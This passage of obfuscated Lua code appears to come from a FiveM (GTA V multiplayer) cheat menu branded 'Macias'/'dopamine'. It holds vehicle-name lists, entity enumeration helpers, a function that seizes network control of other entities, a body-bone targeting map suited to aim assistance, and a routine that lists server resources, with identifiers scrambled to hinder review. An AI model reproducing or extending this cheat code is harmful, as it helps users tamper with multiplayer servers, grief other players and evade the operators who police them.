    "Mesa3",
    "Monster",
    "Monster4",
    "Monster5",
    "Nightshark",
    "RancherXL",
    "RancherXL2",
    "Rebel",
    "Rebel2",
    "RCBandito",
    "Riata",
    "Sandking",
    "Sandking2",
    "Technical",
    "Technical2",
    "Technical3",
    "TrophyTruck",
    "TrophyTruck2",
    "Freecrawler",
    "Menacer"
}
local DLxqWvUGSM = {
    "AlphaZ1",
    "Avenger",
    "Avenger2",
    "Besra",
    "Blimp",
    "blimp2",
    "Blimp3",
    "Bombushka",
    "Cargoplane",
    "Cuban800",
    "Dodo",
    "Duster",
    "Howard",
    "Hydra",
    "Jet",
    "Lazer",
    "Luxor",
    "Luxor2",
    "Mammatus",
    "Microlight",
    "Miljet",
    "Mogul",
    "Molotok",
    "Nimbus",
    "Nokota",
    "Pyro",
    "Rogue",
    "Seabreeze",
    "Shamal",
    "Starling",
    "Stunt",
    "Titan",
    "Tula",
    "Velum",
    "Velum2",
    "Vestra",
    "Volatol",
    "Striekforce"
}
local sF = {
    "BJXL",
    "Baller",
    "Baller2",
    "Baller3",
    "Baller4",
    "Baller5",
    "Baller6",
    "Cavalcade",
    "Cavalcade2",
    "Dubsta",
    "Dubsta2",
    "Dubsta3",
    "FQ2",
    "Granger",
    "Gresley",
    "Habanero",
    "Huntley",
    "Landstalker",
    "patriot",
    "Patriot2",
    "Radi",
    "Rocoto",
    "Seminole",
    "Serrano",
    "Toros",
    "XLS",
    "XLS2"
}
local k = {
    "Asea",
    "Asea2",
    "Asterope",
    "Cog55",
    "Cogg552",
    "Cognoscenti",
    "Cognoscenti2",
    "emperor",
    "emperor2",
    "emperor3",
    "Fugitive",
    "Glendale",
    "ingot",
    "intruder",
    "limo2",
    "premier",
    "primo",
    "primo2",
    "regina",
    "romero",
    "stafford",
    "Stanier",
    "stratum",
    "stretch",
    "surge",
    "tailgater",
    "warrener",
    "Washington"
}
local SLj9VRPcC1 = {
    "Airbus",
    "Brickade",
    "Bus",
    "Coach",
    "Rallytruck",
    "Rentalbus",
    "taxi",
    "Tourbus",
    "Trash",
    "Trash2",
    "WastIndr",
    "PBus2"
}
local kUfuV4rgfTpQ9efCJMt = {
    "Alpha",
    "Banshee",
    "Banshee2",
    "BestiaGTS",
    "Buffalo",
    "Buffalo2",
    "Buffalo3",
    "Carbonizzare",
    "Comet2",
    "Comet3",
    "Comet4",
    "Comet5",
    "Coquette",
    "Deveste",
    "Elegy2",
    "Feltzer2",
    "Feltzer3",
    "FlashGT",
    "Furoregt",
    "Fusilade",
    "Futo",
    "GB200",
    "Hotring",
    "Infernus2",
    "Italigto",
    "Jester",
    "Jester2",
    "Khamelion",
    "Kurama",
    "Kurama2",
    "Lynx",
    "MAssacro",
    "MAssacro2",
    "neon",
    "Ninef",
    "ninfe2",
    "omnis",
    "Pariah",
    "Penumbra",
    "Raiden",
    "RapidGT",
    "RapidGT2",
    "Raptor",
    "Revolter",
    "Ruston",
    "Schafter2",
    "Schafter3",
    "Schafter4",
    "Schafter5",
    "Schafter6",
    "Schlagen",
    "Schwarzer",
    "Sentinel3",
    "Seven70",
    "Specter",
    "Specter2",
    "Streiter",
    "Sultan",
    "Surano",
    "Tampa2",
    "Tropos",
    "Verlierer2",
    "ZR380"
}
local LJF = {
    "Ardent",
    "BType",
    "BType2",
    "BType3",
    "Casco",
    "Cheetah2",
    "Cheburek",
    "Coquette2",
    "Coquette3",
    "Deluxo",
    "Fagaloa",
    "Gt500",
    "JB700",
    "Jester3",
    "MAmba",
    "Manana",
    "Michelli",
    "Monroe",
    "Peyote",
    "Pigalle",
    "RapidGT3",
    "Retinue",
    "Savestra",
    "Stinger",
    "Stingergt",
    "Stromberg",
    "Swinger",
    "Torero",
    "Tornado",
    "Tornado2",
    "Tornado3",
    "Tornado4",
    "Tornado5",
    "Tornado6",
    "Viseris",
    "Z190",
    "ZType"
}
local twj = {
    "Adder",
    "Autarch",
    "Bullet",
    "Cheetah",
    "Cyclone",
    "Elegy",
    "EntityXF",
    "Entity2",
    "FMJ",
    "GP1",
    "Infernus",
    "LE7B",
    "Nero",
    "Nero2",
    "Osiris",
    "Penetrator",
    "PFister811",
    "Prototipo",
    "Reaper",
    "SC1",
    "Scramjet",
    "Sheava",
    "SultanRS",
    "Superd",
    "T20",
    "Taipan",
    "Tempesta",
    "Tezeract",
    "Turismo2",
    "Turismor",
    "Tyrant",
    "Tyrus",
    "Vacca",
    "Vagner",
    "Vigilante",
    "Visione",
    "Voltic",
    "Voltic2",
    "Zentorno",
    "Italigtb",
    "Italigtb2",
    "XA21"
}
local FV4sStVi_L7K = {
    "ArmyTanker",
    "ArmyTrailer",
    "ArmyTrailer2",
    "BaleTrailer",
    "BoatTrailer",
    "CableCar",
    "DockTrailer",
    "Graintrailer",
    "Proptrailer",
    "Raketailer",
    "TR2",
    "TR3",
    "TR4",
    "TRFlat",
    "TVTrailer",
    "Tanker",
    "Tanker2",
    "Trailerlogs",
    "Trailersmall",
    "Trailers",
    "Trailers2",
    "Trailers3"
}
local ltyYOTPBeQM1sICt = {
    "Freight",
    "Freightcar",
    "Freightcont1",
    "Freightcont2",
    "Freightgrain",
    "Freighttrailer",
    "TankerCar"
}
local vQDlNDB52Lfbea = {
    "Airtug",
    "Caddy",
    "Caddy2",
    "Caddy3",
    "Docktug",
    "Forklift",
    "Mower",
    "Ripley",
    "Sadler",
    "Scrap",
    "TowTruck",
    "Towtruck2",
    "Tractor",
    "Tractor2",
    "Tractor3",
    "TrailerLArge2",
    "Utilitruck",
    "Utilitruck3",
    "Utilitruck2"
}
local tzL = {
    "Bison",
    "Bison2",
    "Bison3",
    "BobcatXL",
    "Boxville",
    "Boxville2",
    "Boxville3",
    "Boxville4",
    "Boxville5",
    "Burrito",
    "Burrito2",
    "Burrito3",
    "Burrito4",
    "Burrito5",
    "Camper",
    "GBurrito",
    "GBurrito2",
    "Journey",
    "Minivan",
    "Minivan2",
    "Paradise",
    "pony",
    "Pony2",
    "Rumpo",
    "Rumpo2",
    "Rumpo3",
    "Speedo",
    "Speedo2",
    "Speedo4",
    "Surfer",
    "Surfer2",
    "Taco",
    "Youga",
    "youga2"
}
local hm5xuURWI8CQXvc5eGxI = {
    aPGGHJKHG,
    eUIXavmdljBdDFJH,
    z5QG8BaSTvKrkGGJh,
    gU7undK07wjy6vCfIyiEAqWed,
    lg_0Za1iqz20VMOAQWDD,
    W6dX0_K3Lc3AqwDFF,
    zYA6_CLMvSUGAASH,
    ZQKbrOM8ASHDDH,
    A,
    tIZojnN,
    stcEc,
    saK2v1PHfgjxyqh5u,
    DLxqWvUGSM,
    sF,
    k,
    SLj9VRPcC1,
    kUfuV4rgfTpQ9efCJMt,
    LJF,
    twj,
    FV4sStVi_L7K,
    ltyYOTPBeQM1sICt,
    vQDlNDB52Lfbea,
    tzL
}
OTablini = {}
do
    function OTablini.insert(rl6i5PQ5meq2C, LFVJF4LUEol7NEnx, kat3x1LjKGxPqj2h)
        if not rawget(rl6i5PQ5meq2C._values, LFVJF4LUEol7NEnx) then
            rl6i5PQ5meq2C._keys[#rl6i5PQ5meq2C._keys + 1] = LFVJF4LUEol7NEnx
        end
        if kat3x1LjKGxPqj2h == nil then
            OTablini.remove(rl6i5PQ5meq2C, LFVJF4LUEol7NEnx)
        else
            rl6i5PQ5meq2C._values[LFVJF4LUEol7NEnx] = kat3x1LjKGxPqj2h
        end
    end
    local function eRRLSycNgp(SZoiXWHMyjDzaq1l86fA, Ip_Bx97KMmUo)
        for UhudwsIJ873fBO, KT in ipairs(SZoiXWHMyjDzaq1l86fA) do
            if KT == Ip_Bx97KMmUo then
                return UhudwsIJ873fBO
            end
        end
    end
    function OTablini.remove(tyO7y6vUopvd0x, l)
        local krW3xC49f1QZbjmIO_e = tyO7y6vUopvd0x._values[l]
        if krW3xC49f1QZbjmIO_e ~= nil then
            table.remove(tyO7y6vUopvd0x._keys, eRRLSycNgp(tyO7y6vUopvd0x._keys, l))
            tyO7y6vUopvd0x._values[l] = nil
        end
        return krW3xC49f1QZbjmIO_e
    end
    function OTablini.index(HWkoHOXB8eyj, lyfssml99)
        return rawget(HWkoHOXB8eyj._values, lyfssml99)
    end
    function OTablini.pairs(L_MzKgHc_h4SZpd)
        local nNM01e = 0
        return function()
            nNM01e = nNM01e + 1
            local VciQ8ABknbdGFsuPc = L_MzKgHc_h4SZpd._keys[nNM01e]
            if VciQ8ABknbdGFsuPc ~= nil then
                return VciQ8ABknbdGFsuPc, L_MzKgHc_h4SZpd._values[VciQ8ABknbdGFsuPc]
            end
        end
    end
    function OTablini.new(yHhb0C9gMfB0n4T_e7kP6)
        yHhb0C9gMfB0n4T_e7kP6 = yHhb0C9gMfB0n4T_e7kP6 or {}
        local gFkoS2ut7wPox = {_keys = {}, _values = {}}
        local fFB_S = #yHhb0C9gMfB0n4T_e7kP6
        if fFB_S % 2 ~= 0 then
            error "in OTablini initialization: key is missing value"
        end
        for i = 1, fFB_S / 2 do
            local _rdZT9wmRmWhM = yHhb0C9gMfB0n4T_e7kP6[i * 2 - 1]
            local EwlSzVKsp6XYKl = yHhb0C9gMfB0n4T_e7kP6[i * 2]
            if gFkoS2ut7wPox._values[_rdZT9wmRmWhM] ~= nil then
                error("duplicate key:" .. _rdZT9wmRmWhM)
            end
            gFkoS2ut7wPox._keys[#gFkoS2ut7wPox._keys + 1] = _rdZT9wmRmWhM
            gFkoS2ut7wPox._values[_rdZT9wmRmWhM] = EwlSzVKsp6XYKl
        end
        return setmetatable(
            gFkoS2ut7wPox,
            {__newindex = OTablini.insert, __len = function(ihmjhGVRaJkdVL)
                    return #ihmjhGVRaJkdVL._keys
                end, __pairs = OTablini.pairs, __index = gFkoS2ut7wPox._values}
        )
    end
end
local tmRYPbRPCXZRiQNverM = {
    __gc = function(wvjdM7e9KRVS)
        if wvjdM7e9KRVS.destructor and wvjdM7e9KRVS.handle then
            wvjdM7e9KRVS.destructor(wvjdM7e9KRVS.handle)
        end
        wvjdM7e9KRVS.destructor = nil
        wvjdM7e9KRVS.handle = nil
    end
}
local function em(GqmvStHw, h1b4w325g6cHAgfBXvQke, gIFyCUJ0T8)
    return coroutine.wrap(
        function()
            local ok3Z90eKyNbdeBlHK, Wpn13yCwVGrkVLHZV9m = GqmvStHw()
            if not Wpn13yCwVGrkVLHZV9m or Wpn13yCwVGrkVLHZV9m == 0 then
                gIFyCUJ0T8(ok3Z90eKyNbdeBlHK)
                return
            end
            local esWLRZnfkNGrvDEV0qHs = {handle = ok3Z90eKyNbdeBlHK, destructor = gIFyCUJ0T8}
            setmetatable(esWLRZnfkNGrvDEV0qHs, tmRYPbRPCXZRiQNverM)
            local ZaY5FpZeX0 = true
            repeat
                coroutine.yield(Wpn13yCwVGrkVLHZV9m)
                ZaY5FpZeX0, Wpn13yCwVGrkVLHZV9m = h1b4w325g6cHAgfBXvQke(ok3Z90eKyNbdeBlHK)
            until not ZaY5FpZeX0
            esWLRZnfkNGrvDEV0qHs.destructor, esWLRZnfkNGrvDEV0qHs.handle = nil, nil
            gIFyCUJ0T8(ok3Z90eKyNbdeBlHK)
        end
    )
end
function EnumerateObjects()
    return em(FindFirstObject, FindNextObject, EndFindObject)
end
function EnumeratePeds()
    return em(FindFirstPed, FindNextPed, EndFindPed)
end
function EnumerateVehicles()
    return em(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end
function EnumeratePickups()
    return em(FindFirstPickup, FindNextPickup, EndFindPickup)
end
function RequestControlOnce(ngt2A)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(ngt2A) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(ngt2A), true)
    return NetworkRequestControlOfEntity(ngt2A)
end
function GetNearbyPeds(Wl, Lr7hj, xxVFG4nedyESysWxc6S80, iLZfwRfS4wbXQ)
    local BD3Eu6gaCWi8tmhz = {}
    for ItSQLIOL in EnumeratePeds() do
        if DoesEntityExist(ItSQLIOL) then
            local rqvmVLe_Uyn2A3bvRGd = GetEntityCoords(ItSQLIOL, false)
            if
                Vdist(
                    Wl,
                    Lr7hj,
                    xxVFG4nedyESysWxc6S80,
                    rqvmVLe_Uyn2A3bvRGd.x,
                    rqvmVLe_Uyn2A3bvRGd.y,
                    rqvmVLe_Uyn2A3bvRGd.z
                ) <= iLZfwRfS4wbXQ
             then
                table.insert(BD3Eu6gaCWi8tmhz, ItSQLIOL)
            end
        end
    end
    return BD3Eu6gaCWi8tmhz
end
function RotationToDirection(XFKjWT24oYULO)
    local D = math.rad(XFKjWT24oYULO.z)
    local FJY2duz7YgXdj = math.rad(XFKjWT24oYULO.x)
    local gT0Q5SL9UQZV_VI4syC06 = math.abs(math.cos(FJY2duz7YgXdj))
    return vector3(-math.sin(D) * gT0Q5SL9UQZV_VI4syC06, math.cos(D) * gT0Q5SL9UQZV_VI4syC06, math.sin(FJY2duz7YgXdj))
end
function ScreenToWorld(kMogURQ5Qw9K)
    local nUSPpWYKgnYQO4NVXb = GetGameplayCamRot(2)
    local PSoMHCNWnvV = GetGameplayCamCoord()
    local DlNOGO3ikzmJxZmgzD0uQ = 0
    local M = 0
    local w4l9B8mOzZ599dWls = 0
    local tEYMd4 = 0
    local sMNejBHLHSPm_REKG = RotationToDirection(nUSPpWYKgnYQO4NVXb)
    local Gl = vector3(nUSPpWYKgnYQO4NVXb.x + 10, nUSPpWYKgnYQO4NVXb.y + 0, nUSPpWYKgnYQO4NVXb.z + 0)
    local dwJLQ0pIsgCZw_5u3 = vector3(nUSPpWYKgnYQO4NVXb.x - 10, nUSPpWYKgnYQO4NVXb.y + 0, nUSPpWYKgnYQO4NVXb.z + 0)
    local lUBZY4175sgAE_ = vector3(nUSPpWYKgnYQO4NVXb.x, nUSPpWYKgnYQO4NVXb.y + 0, nUSPpWYKgnYQO4NVXb.z + -10)
    local uXSy =
        RotationToDirection(vector3(nUSPpWYKgnYQO4NVXb.x, nUSPpWYKgnYQO4NVXb.y + 0, nUSPpWYKgnYQO4NVXb.z + 10)) -
        RotationToDirection(lUBZY4175sgAE_)
    local YvOVSJWZH_Q = RotationToDirection(Gl) - RotationToDirection(dwJLQ0pIsgCZw_5u3)
    local vZ_f2Z9xDFxqIs1nOfdc = -(math.rad(nUSPpWYKgnYQO4NVXb.y))
    vect33 = (uXSy * math.cos(vZ_f2Z9xDFxqIs1nOfdc)) - (YvOVSJWZH_Q * math.sin(vZ_f2Z9xDFxqIs1nOfdc))
    vect34 = (uXSy * math.sin(vZ_f2Z9xDFxqIs1nOfdc)) - (YvOVSJWZH_Q * math.cos(vZ_f2Z9xDFxqIs1nOfdc))
    local bCBpFhd, IA_p4bvh3JFQrvMB99, AXWcve =
        WorldToScreenRel(((PSoMHCNWnvV + (sMNejBHLHSPm_REKG * 10)) + vect33) + vect34)
    if not bCBpFhd then
        DlNOGO3ikzmJxZmgzD0uQ = IA_p4bvh3JFQrvMB99
        M = AXWcve
        return PSoMHCNWnvV + (sMNejBHLHSPm_REKG * 10)
    end
    local yQ6FFWM_CLQ9ggToTrLy, Y7y, O4pLfqZDKLC = WorldToScreenRel(PSoMHCNWnvV + (sMNejBHLHSPm_REKG * 10))
    if not yQ6FFWM_CLQ9ggToTrLy then
        tEYMd4 = Y7y
        w4l9B8mOzZ599dWls = O4pLfqZDKLC
        return PSoMHCNWnvV + (sMNejBHLHSPm_REKG * 10)
    end
    if math.abs(DlNOGO3ikzmJxZmgzD0uQ - tEYMd4) < 0.001 or math.abs(M - w4l9B8mOzZ599dWls) < 0.001 then
        return PSoMHCNWnvV + (sMNejBHLHSPm_REKG * 10)
    end
    local yAu = (kMogURQ5Qw9K.x - tEYMd4) / (DlNOGO3ikzmJxZmgzD0uQ - tEYMd4)
    local O = (kMogURQ5Qw9K.y - w4l9B8mOzZ599dWls) / (M - w4l9B8mOzZ599dWls)
    return ((PSoMHCNWnvV + (sMNejBHLHSPm_REKG * 10)) + (vect33 * yAu)) + (vect34 * O)
end
function SubVectors(md8Qa70dG2tu4wQ, J9ED1GwMR3MBa8UKxs)
    return vector3(
        md8Qa70dG2tu4wQ.x - J9ED1GwMR3MBa8UKxs.x,
        md8Qa70dG2tu4wQ.y - J9ED1GwMR3MBa8UKxs.y,
        md8Qa70dG2tu4wQ.z - J9ED1GwMR3MBa8UKxs.z
    )
end
function GetCamDirFromScreenCenter()
    local XfXZccyVHz = GetGameplayCamCoord()
    local uk6n = ScreenToWorld(0, 0)
    local Yg01r7la3 = SubVectors(uk6n, XfXZccyVHz)
    return Yg01r7la3
end
function WorldToScreenRel(Q9or3i3)
    local LN_eSMBpGd0eF2, FBU1, YpK9xulc4bVcF = GetScreenCoordFromWorldCoord(Q9or3i3.x, Q9or3i3.y, Q9or3i3.z)
    if not LN_eSMBpGd0eF2 then
        return false
    end
    screenCoordsx = (FBU1 - 0.5) * 2
    screenCoordsy = (YpK9xulc4bVcF - 0.5) * 2
    return true, screenCoordsx, screenCoordsy
end
function PrintTable(qDuUvQar)
    local function aWUz3PIUFFCc(woLJlDwDfSUz)
        local pTsgbZ = " "
        for i = 1, woLJlDwDfSUz do
            pTsgbZ = pTsgbZ .. "	"
        end
        return pTsgbZ
    end
    local FmZQcXg3ZS7M, w9aBnd4rVVCWU4e, IStY = {}, {}, {}
    local FS3YIxWJVWkOSCySSs = 1
    local PNToyUut5TVutraIn3qw1 = "{"
    while true do
        local i7elha9jWtCi7 = 0
        for d6MMxwZ4adENkv, Vh4uP4cVAU7xI3bCd in pairs(qDuUvQar) do
            i7elha9jWtCi7 = i7elha9jWtCi7 + 1
        end
        local udSpgzT8k3xo_1g8 = 1
        for ov_s, DfSi19OIQd5u8jE0hJD7E in pairs(qDuUvQar) do
            if (FmZQcXg3ZS7M[qDuUvQar] == nil) or (udSpgzT8k3xo_1g8 >= FmZQcXg3ZS7M[qDuUvQar]) then
                if (string.find(PNToyUut5TVutraIn3qw1, "}", PNToyUut5TVutraIn3qw1:len())) then
                    PNToyUut5TVutraIn3qw1 = PNToyUut5TVutraIn3qw1 .. ","
                elseif not (string.find(PNToyUut5TVutraIn3qw1, "", PNToyUut5TVutraIn3qw1:len())) then
                    PNToyUut5TVutraIn3qw1 = PNToyUut5TVutraIn3qw1 .. ""
                end
                table.insert(IStY, PNToyUut5TVutraIn3qw1)
                PNToyUut5TVutraIn3qw1 = " "
                local q6d7bT
                if (type(ov_s) == "number" or type(ov_s) == "boolean") then
                    q6d7bT = "[" .. tostring(ov_s) .. "]"
                else
                    q6d7bT = "['" .. tostring(ov_s) .. "']"
                end
                if (type(DfSi19OIQd5u8jE0hJD7E) == "number" or type(DfSi19OIQd5u8jE0hJD7E) == "boolean") then
                    PNToyUut5TVutraIn3qw1 =
                        PNToyUut5TVutraIn3qw1 ..
                        aWUz3PIUFFCc(FS3YIxWJVWkOSCySSs) .. q6d7bT .. " = " .. tostring(DfSi19OIQd5u8jE0hJD7E)
                elseif (type(DfSi19OIQd5u8jE0hJD7E) == "table") then
                    PNToyUut5TVutraIn3qw1 =
                        PNToyUut5TVutraIn3qw1 .. aWUz3PIUFFCc(FS3YIxWJVWkOSCySSs) .. q6d7bT .. " = {"
                    table.insert(w9aBnd4rVVCWU4e, qDuUvQar)
                    table.insert(w9aBnd4rVVCWU4e, DfSi19OIQd5u8jE0hJD7E)
                    FmZQcXg3ZS7M[qDuUvQar] = udSpgzT8k3xo_1g8 + 1
                    break
                else
                    PNToyUut5TVutraIn3qw1 =
                        PNToyUut5TVutraIn3qw1 ..
                        aWUz3PIUFFCc(FS3YIxWJVWkOSCySSs) .. q6d7bT .. " = '" .. tostring(DfSi19OIQd5u8jE0hJD7E) .. "'"
                end
                if (udSpgzT8k3xo_1g8 == i7elha9jWtCi7) then
                    PNToyUut5TVutraIn3qw1 = PNToyUut5TVutraIn3qw1 .. "" .. aWUz3PIUFFCc(FS3YIxWJVWkOSCySSs - 1) .. "}"
                else
                    PNToyUut5TVutraIn3qw1 = PNToyUut5TVutraIn3qw1 .. ","
                end
            else
                if (udSpgzT8k3xo_1g8 == i7elha9jWtCi7) then
                    PNToyUut5TVutraIn3qw1 = PNToyUut5TVutraIn3qw1 .. "" .. aWUz3PIUFFCc(FS3YIxWJVWkOSCySSs - 1) .. "}"
                end
            end
            udSpgzT8k3xo_1g8 = udSpgzT8k3xo_1g8 + 1
        end
        if (i7elha9jWtCi7 == 0) then
            PNToyUut5TVutraIn3qw1 = PNToyUut5TVutraIn3qw1 .. "" .. aWUz3PIUFFCc(FS3YIxWJVWkOSCySSs - 1) .. "}"
        end
        if (#w9aBnd4rVVCWU4e > 0) then
            qDuUvQar = w9aBnd4rVVCWU4e[#w9aBnd4rVVCWU4e]
            w9aBnd4rVVCWU4e[#w9aBnd4rVVCWU4e] = nil
            FS3YIxWJVWkOSCySSs = FmZQcXg3ZS7M[qDuUvQar] == nil and FS3YIxWJVWkOSCySSs + 1 or FS3YIxWJVWkOSCySSs - 1
        else
            break
        end
    end
    table.insert(IStY, PNToyUut5TVutraIn3qw1)
    PNToyUut5TVutraIn3qw1 = table.concat(IStY)
    print(PNToyUut5TVutraIn3qw1)
end
function RequestModelSync(cXkDUzbjXsl)
    local dW3g9 = GetHashKey(cXkDUzbjXsl)
    RequestModel(dW3g9)
    while not HasModelLoaded(dW3g9) do
        RequestModel(dW3g9)
        Citizen.Wait(0)
    end
end
local function DpYO8(ywPzel2kqYq_iyo)
    local pm3sd368LgFT_H = {}
    local BD21m = GetGameTimer() / 200
    pm3sd368LgFT_H.r = math.floor(math.sin(BD21m * ywPzel2kqYq_iyo + 0) * 127 + 128)
    pm3sd368LgFT_H.g = math.floor(math.sin(BD21m * ywPzel2kqYq_iyo + 2) * 127 + 128)
    pm3sd368LgFT_H.b = math.floor(math.sin(BD21m * ywPzel2kqYq_iyo + 4) * 127 + 128)
    return pm3sd368LgFT_H
end
function table.removekey(SVaSOzJNF, FROBTwPjm4mU1JBygrMP)
    for i = 1, #SVaSOzJNF do
        if SVaSOzJNF[i] == FROBTwPjm4mU1JBygrMP then
            table.remove(SVaSOzJNF, i)
        end
    end
end
function GetWeaponNameFromHash(KqqygbDDppKw0nmuBmwJh)
    for i = 1, #iys3AbTbrGHJF do
        if GetHashKey(iys3AbTbrGHJF[i]) == KqqygbDDppKw0nmuBmwJh then
            return string.sub(iys3AbTbrGHJF[i], 8)
        end
    end
end
function GetInputMode()
    return Citizen.InvokeNative(-6525200845567248616, 2) and "MouseAndKeyboard" or "GamePad"
end
function ScaleVector(mnYu, v85fzktbTcNWM9QoxD)
    return vector3(mnYu.x * v85fzktbTcNWM9QoxD, mnYu.y * v85fzktbTcNWM9QoxD, mnYu.z * v85fzktbTcNWM9QoxD)
end
function AddVectors(bCbS, gSAqEKRc_hz)
    return vector3(bCbS.x + gSAqEKRc_hz.x, bCbS.y + gSAqEKRc_hz.y, bCbS.z + gSAqEKRc_hz.z)
end
function forceOscillate(h1Bq, kjLj4, D5QFuEqGn_3, gbLC7Qy)
    local rhagbw9K9 = ScaleVector(SubVectors(kjLj4, GetEntityCoords(h1Bq)), (D5QFuEqGn_3 * D5QFuEqGn_3))
    local Bmt58rgydvz =
        AddVectors(ScaleVector(GetEntityVelocity(h1Bq), (2 * D5QFuEqGn_3 * gbLC7Qy)), vector3(0, 0, 0.1))
    local ZxEgrZiPBW7mR03ka5Su8 = SubVectors(rhagbw9K9, Bmt58rgydvz)
    ApplyForceToEntity(h1Bq, 3, ZxEgrZiPBW7mR03ka5Su8, 0, 0, 0, false, false, true, true, false, true)
end
requestModel = function(RuTJEl7p2UbnJ4di)
    Citizen.CreateThread(
        function()
            while NywuctsA4BD4b3_G0 do
                RequestModel(RuTJEl7p2UbnJ4di)
                while not HasModelLoaded(RuTJEl7p2UbnJ4di) do
                    Citizen.Wait(0)
                end
                Citizen.Wait(0)
            end
        end
    )
end
local function hbfOMCwpUi9V2K(O_21C5Zap5VZ4V)
    if O_21C5Zap5VZ4V == "Head" then
        return "SKEL_Head"
    elseif O_21C5Zap5VZ4V == "Chest" then
        return "SKEL_Spine2"
    elseif O_21C5Zap5VZ4V == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif O_21C5Zap5VZ4V == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif O_21C5Zap5VZ4V == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif O_21C5Zap5VZ4V == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif O_21C5Zap5VZ4V == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end
function InitializeIntro(QlRajxPI, W7Txk7Fopmp5AhzP90f)
    local Cd9ftEs7wODSPl = RequestScaleformMovie(QlRajxPI)
    while not HasScaleformMovieLoaded(Cd9ftEs7wODSPl) do
        Citizen.Wait(1)
    end
    PushScaleformMovieFunction(Cd9ftEs7wODSPl, "SHOW_SHARD_WASTED_MP_MESSAGE")
    PushScaleformMovieFunctionParameterString(W7Txk7Fopmp5AhzP90f)
    PopScaleformMovieFunctionVoid()
    return Cd9ftEs7wODSPl
end
function math.round(r3FnolgqoLtgH8xdS6, fTUp2XSj_exS)
    return tonumber(string.format("%." .. (fTUp2XSj_exS or 0) .. "f", r3FnolgqoLtgH8xdS6))
end
function string.IsNullOrEmpty(n3ZWF2WtmzscA)
    return n3ZWF2WtmzscA == nil or n3ZWF2WtmzscA == " "
end
function changeModel(SWW2thF5)
    local rhyHCTPsndx96aI = GetHashKey(SWW2thF5)
    if (IsModelInCdimage(rhyHCTPsndx96aI)) then
        if (IsModelValid(rhyHCTPsndx96aI)) then
            RequestModel(rhyHCTPsndx96aI)
            if (HasModelLoaded(rhyHCTPsndx96aI)) then
                SetPlayerModel(PlayerId(), rhyHCTPsndx96aI)
                SetModelAsNoLongerNeeded(rhyHCTPsndx96aI)
            end
        end
    end
end
KeyboardInputMacias = function(UriXWK7yI5frB, sCMM9pBtXNNrs1mVpt, KvBaT4PApyXF_wdQ5DW)
    AddTextEntry("FMMC_KEY_TIP1", UriXWK7yI5frB .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", " ", sCMM9pBtXNNrs1mVpt, " ", " ", " ", KvBaT4PApyXF_wdQ5DW)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local fnQm97 = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return fnQm97
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
--[[getPlayerStatus = function(ws0EPI)
    local tXFVzIKdl4XazK9n0 = GetEntityMaxHealth(ws0EPI)
    local hjs5 = GetEntityHealth(ws0EPI)
    if hjs5 >= 1 then
        return " [~g~Alive~s~] [~g~" .. hjs5 .. "~s~/~g~" .. tXFVzIKdl4XazK9n0 .. "~s~]"
    else
        return " [~r~Dead~s~] [~r~" .. hjs5 .. "~s~/~r~" .. tXFVzIKdl4XazK9n0 .. "~s~]"
    end
end]]
function setupModel(zMIXsPG2TZsuUTxTq)
    RequestModel(zMIXsPG2TZsuUTxTq)
    while not HasModelLoaded(zMIXsPG2TZsuUTxTq) do
        RequestModel(zMIXsPG2TZsuUTxTq)
        Wait(0)
    end
    SetModelAsNoLongerNeeded(zMIXsPG2TZsuUTxTq)
end
local function FgWqg()
    local ouGWmAexz = {}
    for i = 0, GetNumResources() do
        ouGWmAexz[i] = GetResourceByFindIndex(i)
    end
    return ouGWmAexz
end

Macias = {}
Macias.debug = false
local jwZvXv7xDjl3iWV = {}
local bVkNYulEKMs2c5JuO1F = {
    up = keyboard_keys["UP"],
    down = keyboard_keys["DOWN"],
    left = keyboard_keys["LEFT"],
    right = keyboard_keys["RIGHT"],
    select = keyboard_keys["NENTER"],
    back = 202
}
local BAA0iTdNpUgW06 = 0
local BkEd5E1GYgoliqD9ktVZ = 12
local MvpYLMwDWCTCY5gZhBpjy = nil
local j0P1aYqgapaJmkYWlSEjf = nil
local DCOkHa_X39DI4tsCiPLk = 0.11
local vURx5kzEW = 0.05
local y2ZqS01LgvjtSTQBJ = 0.5
local HaQjKKAMvjk5ABgT = 1
local yemRBopz2y = 2
local QVCiRDDcBBAaEe = 0.038
local i3dUIc_3f4 = 0
local lEA8M97Noop = 0.365
local kSVibjWpdXCC37 = 0.005
local Y6ZS8iMhTJOjBq0rm = 0.005
local xSTZixUjS6VL9v = " »"
local HtR = "« "
local YKyAw = {r = 225, g = 55, b = 55, a = 255}
local function wBQ8ncN2OyoKWmCo(Tlyrrz46tw)
    if Macias.debug then
        Citizen.Trace("[dopamine] " .. tostring(Tlyrrz46tw) .. ".")
    end
end
local function XO8g1Wb5PogWmMOsj4(eY_YvTp8gmMw9, EpgVKQ6ztx87hXjB, BO9Bwd3s2JfI6AMwxAn)
    if eY_YvTp8gmMw9 and jwZvXv7xDjl3iWV[eY_YvTp8gmMw9] then
        jwZvXv7xDjl3iWV[eY_YvTp8gmMw9][EpgVKQ6ztx87hXjB] = BO9Bwd3s2JfI6AMwxAn
        wBQ8ncN2OyoKWmCo(
            eY_YvTp8gmMw9 ..
                " menu property changed: { " ..
                    tostring(EpgVKQ6ztx87hXjB) .. ", " .. tostring(BO9Bwd3s2JfI6AMwxAn) .. " }"
        )
    end
end
local function nwxCxw1(k9Xr)
    if k9Xr and jwZvXv7xDjl3iWV[k9Xr] then
        return jwZvXv7xDjl3iWV[k9Xr].visible
    else
        return false
    end
end
local function RAmmfIbUBx(N, gh_SAmgyMC3n, Auamr8px1)
    if N and jwZvXv7xDjl3iWV[N] then
        XO8g1Wb5PogWmMOsj4(N, "visible", gh_SAmgyMC3n)
        if not Auamr8px1 and jwZvXv7xDjl3iWV[N] then
